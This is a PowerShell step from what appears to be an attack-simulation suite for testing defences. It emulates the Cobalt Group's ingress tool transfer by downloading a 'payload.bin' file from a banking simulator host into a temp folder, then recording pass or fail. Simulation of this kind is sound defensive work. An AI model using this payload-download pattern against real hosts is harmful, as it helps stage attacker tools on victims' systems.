# Cobalt Group BFSI - Ingress Tool Transfer (c2-03)
if (-not (Test-BfsiSimulatorConnectivity)) {
  Complete-CgStep @{ Outcome = 'skip'; Reason = 'BFSI simulator not reachable - prerequisite not met' } 'C2-03'
}
$dir = Join-Path $env:TEMP ('bas-sim-c2\' + $script:CgRun)
$file = Join-Path $dir 'payload.bin'
$undo_data = @{ scenario = 'c2-03'; dir = $dir; file = $file }
try { New-CgUndoRecord 'c2-03' $undo_data } catch { Complete-CgStep @{ Outcome = 'error'; Reason = 'Undo record creation failed' } 'C2-03' }

$simHost = Get-BfsiSimulatorHost
$port = Get-BfsiSimulatorPort
try {
  New-Item -ItemType Directory -Force -Path $dir | Out-Null
  Invoke-WebRequest -Method GET -Uri ("http://${simHost}:${port}/api/banking/apps") -OutFile $file -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
} catch {
  Complete-CgStep @{ Outcome = 'error'; Reason = "Tool download failed: $($_.Exception.Message)" } 'C2-03'
}

if ((Test-Path -LiteralPath $file) -and ((Get-Item -LiteralPath $file).Length -gt 0)) {
  $res = @{ Outcome = 'pass'; Reason = 'Tool payload was downloaded and written to disk with non-zero length' }
} else {
  $res = @{ Outcome = 'fail'; Reason = 'Downloaded payload was not written or was empty' }
}
Complete-CgStep $res 'C2-03'
